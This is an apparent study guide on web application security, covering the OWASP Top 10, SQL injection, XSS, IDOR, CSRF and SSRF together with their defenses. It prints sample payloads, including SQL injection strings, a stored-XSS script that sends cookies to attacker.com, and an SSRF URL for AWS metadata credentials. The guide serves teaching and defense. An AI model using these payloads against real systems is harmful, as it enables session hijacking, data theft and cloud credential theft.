# Key to Flow: Web Application Security (OWASP Top 10, SQLi, XSS, IDOR, & SSRF)

**Subject Area:** `03_Computer_Science_and_IT / 05_Computer_Networks_and_Security / Cybersecurity_and_Defensive_Systems / Web_Application_Security_OWASP_Top_10`

---

## 📌 Core Concept & Mental Model
**Untrusted Input Neutralization, Least Privilege Authorization, Context-Aware Output Encoding (XSS/CSP), Parameterized SQL Query Trees (SQLi), Object-Level Access Control (IDOR), and Cloud Metadata Boundary Isolation (SSRF)** govern web application security and offensive/defensive architecture (OWASP Top 10 2021; PortSwigger Web Security Academy; Dafydd Stuttard & Marcus Pinto *The Web Application Hacker's Handbook*; Michal Zalewski *The Tangled Web*):
* **1. OWASP Top 10 Core Categories:**
  - **A01: Broken Access Control (#1 Global Risk):**
    - Failure to enforce server-side ownership checks on sensitive resources.
    - **IDOR (Insecure Direct Object References):** Attacker alters predictable URL parameters (e.g. `/api/invoices/1001` $\to$ `/api/invoices/1002`) to view other tenants' private data.
    - *Defense:* Server-side authorization checks: `SELECT * FROM invoices WHERE id = ? AND user_id = current_user.id`.
  - **A02: Cryptographic Failures:** Storing passwords with unsalted/fast hashes (MD5/SHA1), hardcoded API keys in client-side code, unencrypted HTTP.
  - **A03: Injection (SQL Injection & Command Injection):**
    - Occurs when untrusted user input is directly concatenated into an interpreter query string:
      `"SELECT * FROM users WHERE user = '" + input + "' AND pass = '" + pass + "'"`
    - Exploitation: `' OR '1'='1' -- ` forces condition to evaluate to `TRUE`.
    - Types: Classic/Error-Based, Union-Based (`UNION SELECT null, username, password FROM users --`), Blind Boolean, Blind Time-Based (`WAITFOR DELAY '0:0:5'`).
    - *Absolute Defense:* **Prepared Statements / Parameterized Queries (PDO, PreparedStatement)** where SQL query tree is pre-compiled before user data is bound!
* **2. Cross-Site Scripting (XSS - A03):**
  - **The 3 XSS Flavors:**
    1. **Stored XSS (Persistent):** Malicious JavaScript `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>` is permanently stored in database (e.g. blog comment) and executed in every viewing victim's browser.
    2. **Reflected XSS (Non-Persistent):** Script payload reflected immediately off web server in search results / error messages via phishing link.
    3. **DOM-Based XSS:** Vulnerability entirely inside client-side JavaScript (e.g. `document.getElementById("output").innerHTML = location.hash;`).
  - *Defenses:* Context-Aware HTML/JS Output Encoding, `HttpOnly` cookie flags (prevent JS cookie theft), and **Content Security Policy (CSP)** HTTP headers:
    `Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;`
* **3. Cross-Site Request Forgery (CSRF) vs Server-Side Request Forgery (SSRF):**
  - **CSRF (Client-Side Impersonation):**
    - Tricking an authenticated victim's browser into submitting unauthorized state-changing HTTP requests (e.g. money transfer) to a target site where the user is logged in.
    - *Defenses:* Anti-CSRF Synchronizer Tokens (Cryptographically random tokens validated in POST bodies), `SameSite=Strict` / `SameSite=Lax` cookie attributes.
  - **SSRF (Server-Side Internal Pivot - A10):**
    - Tricking the vulnerable web server backend into fetching an attacker-supplied internal URL.
    - *Cloud Exploitation:* Attacker inputs `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal AWS IAM role STS tokens!
    - *Defenses:* Strict URL host whitelisting, disabling HTTP redirects, enforcing IMDSv2 with token headers, and blocking link-local RFC 3927 IPs.

---

## 🔑 Best Known Study Methodologies & Learning Framework

### 1. The Learn-Break-Fix Web Security Ladder
* Mechanism $\to$ Understand why interpreter mixes code and data.
* Exploit $\to$ Execute payload in controlled lab (PortSwigger Web Security Academy).
* Fix $\to$ Refactor vulnerable code to Parameterized Queries + Context Encoding.

### 2. Top Recommended Resources
* **The Hands-on Gold Standard:** [PortSwigger Web Security Academy](https://portswigger.net/web-security) (Interactive live labs on SQLi, XSS, SSRF, IDOR).
* **The Web Security Bible:** *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (Dafydd Stuttard & Marcus Pinto, Wiley).

---

## 🎯 Problem-Solving Checklist
- [ ] Can you explain why Prepared Statements completely prevent SQL Injection?
- [ ] Can you differentiate Stored, Reflected, and DOM-based XSS?
- [ ] Can you identify an IDOR flaw and write the server-side authorization check to fix it?
- [ ] Can you trace how an SSRF vulnerability extracts AWS IAM keys via `169.254.169.254`?
